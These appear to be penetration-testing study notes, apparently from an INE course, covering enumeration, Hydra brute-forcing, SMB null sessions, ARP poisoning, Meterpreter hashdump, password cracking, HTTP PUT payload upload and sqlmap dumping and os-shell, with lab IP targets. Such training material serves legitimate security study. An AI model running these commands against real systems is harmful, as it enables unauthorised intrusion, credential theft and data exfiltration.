---
description: These are condensed notes from the INE course and other blogs and articles.
---

# Cheatsheet/Notes

## Subnet guide

![TheCybermentor&apos;s subnet guide](../.gitbook/assets/subnet-guide-sheet1.png)

## Common Ports

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Protocol</b>
      </th>
      <th style="text-align:left">Port</th>
      <th style="text-align:left">Service</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">TCP</td>
      <td style="text-align:left">21</td>
      <td style="text-align:left">FTP</td>
    </tr>
    <tr>
      <td style="text-align:left">TCP</td>
      <td style="text-align:left">22</td>
      <td style="text-align:left">SSH</td>
    </tr>
    <tr>
      <td style="text-align:left">TCP</td>
      <td style="text-align:left">25</td>
      <td style="text-align:left">SMTP</td>
    </tr>
    <tr>
      <td style="text-align:left">TCP</td>
      <td style="text-align:left">53</td>
      <td style="text-align:left">DNS</td>
    </tr>
    <tr>
      <td style="text-align:left">TCP</td>
      <td style="text-align:left">80, 443</td>
      <td style="text-align:left">HTTP/HTTPS webserver</td>
    </tr>
    <tr>
      <td style="text-align:left">TCP</td>
      <td style="text-align:left">137-139</td>
      <td style="text-align:left">Windows NetBIOS</td>
    </tr>
    <tr>
      <td style="text-align:left">TCP</td>
      <td style="text-align:left">445</td>
      <td style="text-align:left">
        <p>Windows - SMB</p>
        <p>Linux - Samba service</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">TCP</td>
      <td style="text-align:left">1433-1434</td>
      <td style="text-align:left">MSSQL Database</td>
    </tr>
    <tr>
      <td style="text-align:left">TCP</td>
      <td style="text-align:left">3306</td>
      <td style="text-align:left">MySQL Database</td>
    </tr>
    <tr>
      <td style="text-align:left">TCP</td>
      <td style="text-align:left">8080, 8443</td>
      <td style="text-align:left">HTTP(s) web server, HTTP proxy</td>
    </tr>
  </tbody>
</table>

## Routing

{% hint style="danger" %}
This part is pretty important 😉 
{% endhint %}

### IP

```bash
ip route add 192.168.72.23 via 10.10.10.10(VPN Gateway)
```

### Network

```bash
ip route add 192.168.72.0/24 via 10.10.10.10(VPN Gateway)
```

## Interactive shells

```bash
bash -i
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
```

## Recommended Shells

| Server | Web Shell |
| :--- | :--- |
| Windows | ASP  |
| Apache TomCat | JSP |
| Apache | PHP |

### Reverse Shells

[Pentest Monkey Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---
description: Information Gathering and Footprinting & Scanning
---

# Enumeration

## whois

```bash
whois foo.bar
```

## subdomains

```bash
sublit3r -d foo.bar
```

## ping sweeps

```bash
fping -a -g 10.10.10.0/24
```

```bash
nmap -sS -n 10.10.10.0/24
```

## Nmap

### OS Fingerprinting

```bash
nmap -Pn -A -O 10.10.10.10
```

### Quick scan 

```bash
nmap -sC -sV -A -T4 10.10.10.10 --open
```

### Full scan

```bash
nmap -sC -sV -A -T4 -p- 10.10.10.10 --open
```

---
description: 'SSH, Telnet, RDP, HTTP auth, Windows shares'
---

# Network Attacks

## Hydra

### SSH

```text
hydra -L users.txt -P pass.txt 10 10.10.10.10 ssh
```

### Telnet

```text
hydra -L users.txt -P pass.txt telnet://10.10.10.10
```

### FTP

```text
hydra -L users.txt -P pass.txt ftp://10.10.10.10
```

### POST form login

```text
hydra 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:statement for incorrect login" -L /usr/share/ncrack/minimal.usr -P /etc/john/rockyou.txt
```

Add`-f` to stop the brute-forcing after finding one valid cred.

* /usr/share/seclists/Passwords/rockyou-10.txt
* /usr/share/seclists/Passwords/rockyou-15.txt The above password lists are recommended to run first before the larger rockyou.txt
* /usr/share/ncrack/minimal.usr for users list.

## Windows Shares using Null Sessions

### Shares Enumeration

```text
nmblookup -A 10.10.10.10
```

### List Shares

```text
smbclient -L //10.10.10.10 -N
```

### Mount Share

```text
smbclient //10.10.10.10/sharename -N
```

### enum4linux

```text
enum4linux -a 10.10.10.10
```

The above command does all the previous ones and gives you more data too except mounting the shares, that you have to implement using smbclient.

## ARP Poisoning

### arpspoof

&lt;interface&gt; == eth0/tap0

```text
arpspoof -i <interface> -t target -r host
```

## Metasploit

### Basic

```text
search <term>
use <term>
info
show options
set <option> x
exploit
```

### Meterpreter

**bind\_tcp**: runs a server process on the target machine that waits for connections from attacker machine.

**reverse\_tcp**: performs a TCP connection back to the attacker machine. Helps evade firewall rules.

```text
background #backgrounds the current session
sessions -l
sessions -i %n
sysinfo
ifconfig, route
getuid
getsystem #privesc
bypassuac #if privesc fails
hashdump
cat '/path/to/file.txt'
download '/path/to/fileontarget.txt' /root/mymachine/
```

---
description: Hashes and Passwords
---

# System Attacks

## John the Ripper

### Unshadow

`passwd` is the **/etc/passwd** file  
`shadow` is the **/etc/shadow** file

```text
unshadow passwd shadow > hash
```

### Hash Cracking

```text
john --wordlist=/etc/john/rockyou.txt hash --show
```

Google the commands depending on the hash you find using `hashidentifier`



---
description: Web application vulns and exploits
---

# Web Attacks

## Banner grabbing

### Netcat \(for HTTP services\)

```bash
nc -v 10.10.10.10 port
HEAD / HTTP/1.0
```

### OpenSSL \(for HTTPS services\)

```bash
openssl s_client -connect 10.10.10.10:443
HEAD / HTTP/1.0
```

### Httprint

```bash
httprint -P0 -h 10.10.10.10 -s /usr/share/httprint/signatures.txt
```

## HTTP Verbs

`GET,  POST, HEAD, PUT, DELETE`

### PUT is used to upload a file to the server

You have to find the size of the file you are uploading first

```text
wc -m payload.php
[size] payload.php
```

```text
nc 10.10.10.10 80
PUT /payload.php
Content-type: text/html
Content-length: [size]

```

### DELETE is used to delete a file from the server

```text
nc 10.10.10.10 80
DELETE /path/to/file.txt / HTTP/1.0
```

### OPTIONS is used to query the webserver for enabled HTTP Verbs

```text
nc 10.10.10.10 80
OPTIONS / HTTP/1.0
```

## Directory and File scanning

### Dirbuster

![Dirbuster](../.gitbook/assets/dirbuster.png)

1. You can choose different wordlists for the dictionary brute force but from my experience in most labs you can find them in the `common.txt` 
2. You can also choose different extensions but _`php`_ and _`bak`_ will be the most useful ones to find.
3. If there is HTTP authentication or login of some other kind for the webpage you can set the creds using \[Oprions -&gt; Advanced Options -&gt; Authentication options\]

### dirb

```text
dirb http://10.10.10.10/
```

**If Webpage is authenticated**

```text
dirb http://10.10.10.10/ -u <username>:<password>
```

## Google Dorks

`site:  
intitle:  
inurl:  
filetype:  
AND, OR & |  
-`

[GHDB](https://www.exploit-db.com/google-hacking-database) for more resources.

## XSS \(Cross Site Scripting\)

XSS filter bypass cheatsheet: [OWASP cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

**Reflected XSS**: Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload. 

**Persistent XSS**: Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post.

## SQL Injections

### GET

```sql
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id
```

```sql
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U
```

### Database USER

```sql
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --user
```

### Databases

```text
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --dbs
```

### Dump all

```text
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --dump
```

### POST

Find the parameters that are being passed in POST using BurpSuite.  
E.g: **`username=some&password=thing`** where the parameter username is vulnerable.

```text
sqlmap -u 'http://10.10.10.10/login.php' --data='username=some&password=thing' -p username --technique=B
```

**The Databases, Users and dump-all switches are same as for the GET parameter.**

If you aren't able to deduce which parameter is vulnerable in POST, you can drop the -p switch. SQLMAP will try to test them and find it on it's own so don't sweat it and also for most of the prompts use the default options\(i.e. just press enter\).

The --technique switch is to create less noise and prevent the service from shutting down due to query overload. If the given techniques do not work try it removing the switch.

### OS-Shell

```text
sqlmap -u "http://10.10.10.10/login.php" --os-shell
```

### SQL-Shell

```text
sqlmap -u "http://10.10.10.10/login.php" --sql-shell
```

